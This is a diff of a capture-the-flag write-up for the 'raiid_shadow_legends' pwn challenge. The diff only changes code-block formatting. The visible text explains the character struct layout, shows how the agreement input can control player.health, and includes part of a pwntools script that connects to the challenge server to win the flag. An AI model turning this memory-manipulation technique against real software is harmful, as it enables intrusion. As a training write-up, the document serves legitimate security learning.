@@ -24,14 +24,14 @@ Category: Pwn
 ```raiid_shadow_legends.cpp``` and ```raiid_shadow_legends (executable)``` are provided. <br> <br>
 
 The binary is made up of a struct <br>
-```
+{% highlight c %}
 struct character {
     int health;
     int skill;
     long tokens;
     string name;
 };
-```
+{% endhighlight %}
 <br>
 
 and three functions: <br>
@@ -122,14 +122,14 @@ It looks like we can control ```player.health``` values by ```agreement```! <br>
 # Solution
 
 Now, take a look at the struct again: <br>
-```
+{% highlight c %}
 struct character {
     int health; // This field is 4 bytes long
     int skill; // This field is 4 bytes long
     long tokens; // This field is 8 bytes long
     string name; // This field is whatever bytes long (Seriously, check this out: https://shaharmike.com/cpp/std-string/)
 };
-```
+{% endhighlight %}
 In order to understand how values are handled, we're going to input just enough to fill (when prompted for the agreement):
 - ```int character.health``` <br>
 - ```int character.skill``` <br>
@@ -202,7 +202,7 @@ We see no other ```0x42424242``` other that the ones we gave, so our hypothesis 
 
 If we replace the ```0x42424242``` with the hex values of ```1337```, we will win!
 
-```
+{% highlight python %}
 import pwn
 
 r = pwn.remote("shell.actf.co", 21300) # Open connection
@@ -228,7 +228,7 @@ r.sendline(b"2")
 print(r.recvline().decode().strip()) # PLAY: flag
 
 r.close()
-```
+{% endhighlight %}
 
 # Exploit output
 
